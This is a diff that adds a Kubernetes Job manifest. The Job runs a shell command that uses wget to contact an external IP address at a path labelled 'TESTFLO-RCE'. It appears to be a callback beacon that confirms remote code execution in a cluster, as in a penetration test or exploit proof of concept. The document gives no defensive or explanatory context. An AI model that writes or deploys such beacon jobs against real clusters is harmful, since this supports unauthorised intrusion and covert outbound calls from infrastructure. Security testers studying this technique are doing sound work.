@@ -1,0 +1,19 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: testflo-callback-3
+  namespace: default
+spec:
+  ttlSecondsAfterFinished: 300
+  template:
+    spec:
+      containers:
+      - name: callback
+        image: alpine:3.19
+        command:
+        - /bin/sh
+        - -c
+        - |
+          wget -q -O- http://82.165.195.38/TESTFLO-RCE || true
+      restartPolicy: Never
+  backoffLimit: 1
